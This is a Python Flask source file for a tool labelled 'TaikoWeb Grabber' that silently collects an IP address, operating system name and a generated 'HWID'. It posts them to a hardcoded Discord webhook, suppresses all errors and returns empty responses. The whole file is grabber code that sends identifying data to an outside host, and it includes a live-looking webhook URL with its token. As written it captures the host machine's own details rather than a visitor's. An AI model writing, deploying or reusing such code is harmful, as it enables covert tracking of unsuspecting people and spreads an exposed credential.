from flask import Flask
import requests
import platform
import uuid

app = Flask(__name__)

WEBHOOK_URL = 'https://discord.com/api/webhooks/1342987990468923464/iIGYeSKvM6ZiRp1jCr4WIv1NhXc-FWCbrXX9VuMjE2s8cqy9GOmW78pRPNWgGWP3oFr8'

def send_to_discord(ip, os, hwid):
    embed = {
        "title": "TaikoWeb Log",
        "description": "@here",
        "color": 16711680,
        "fields": [
            {
                "name": "IP Address 🌐",
                "value": f"```{ip}```",
                "inline": True
            },
            {
                "name": "Operating System 💻",
                "value": f"{os} 🖥️",
                "inline": True
            },
            {
                "name": "HWID 🔑",
                "value": f"{hwid} 🔑",
                "inline": True
            }
        ],
        "footer": {
            "text": "TaikoWeb Grabber: UN3THIC4L"
        }
    }
    try:
        requests.post(WEBHOOK_URL, json={"embeds": [embed]})
    except requests.exceptions.RequestException as e:
        pass  # Do nothing on error, you can log if needed.

@app.route('/collect-data', methods=['GET'])
def collect_data():
    try:
        # Get the IP address
        ip_response = requests.get("https://api.ipify.org?format=json")
        ip = ip_response.json().get("ip")
        if not ip:
            return '', 400  # Silent error, nothing returned

        # Get the OS
        os = platform.system()

        # Generate HWID
        hwid = str(uuid.uuid4())

        # Send data to Discord
        send_to_discord(ip, os, hwid)

    except requests.exceptions.RequestException:
        pass  # Do nothing on error, you can log if needed.

    return '', 200  # No return content, just a successful status

@app.route('/')
def home():
    return '', 200  # No return content, just a successful status

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)

